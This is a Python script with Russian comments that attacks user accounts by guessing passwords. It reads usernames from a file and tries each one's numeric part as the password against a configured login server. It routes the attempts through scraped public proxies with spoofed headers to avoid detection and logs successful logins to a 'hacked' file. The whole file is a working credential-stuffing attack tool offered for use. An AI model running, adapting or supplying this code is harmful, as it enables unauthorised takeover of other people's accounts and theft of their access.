# Импорт библиотек
import requests, time, json
import logging
from rich.logging import RichHandler

from config import *

FORMAT = "%(message)s"
logging.basicConfig(
    level=logging.INFO, format=FORMAT, datefmt="[%X]", handlers=[RichHandler()]
) # настройки для логгинга

log = logging.getLogger("rich") # инциализация лога

# логин с помощью стороннего прокси используя входные параметры: логин и пароль
def s2(user, password):
    r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all")
    proxy_list = r.text.split("\r\n")
    for p in proxy_list:
        proxies = {"http" : "http://" + p, "https" : "http://" + p}
        try:
          n = requests.post("https://"+SERVER+"/"+LOGIN, data = {"username" : user.upper(), "password" : password}, headers={"X-Requested-With" : X_REQUESTED_WITH, "User-Agent" : USER_FISH_AGENT}, proxies=proxies, timeout=2)
          return n
        except: time.sleep(0.2)
    return 0

# функция для получения цифровой части аккаунта
def getNumericPart(string):
    res = ''
    for i in string:
        if (i.isnumeric()): res = res + i
    return res

# сама функция взлома
def hack(user, i):
    username = user.split("{'id': '")[1].split("'")[0]
    passwords = [getNumericPart(username)]
    if (len(passwords[0]) != 8): return
    print(username,i)
    for password in passwords:
        if (not password): continue
        if (len(password) < 4): continue
        r = s2(username, password)
        print(r.status_code, username, password)
        open("number_hack/statteam2.txt","w").write(r.text)
        if (r.status_code == 200) or (r.text.find("this network") > -1): 
            open("number_hack/hacked.txt", "a").write(username + " " + password + "\n")
            log.info(f"Пароль получен! {username}: {password}")
        time.sleep(5)

def start():
    print(green + f"[INFO] Взлманные аккаунты сохраняютс яв файле number_hack/hacked.txt")
    print(
        cyan + f"[TIP] Пароли иногда могут быть недействительными. Тем не менее, 99% определенных программой паролей совпадают с настоящими.") # выводим подсказку

    i = 1
    for user in open("number_hack/_userlist.txt").read().split("\n"):
        hack(user,i)
        i+=1
        open("number_hack/stateam.txt", "w").write(user)

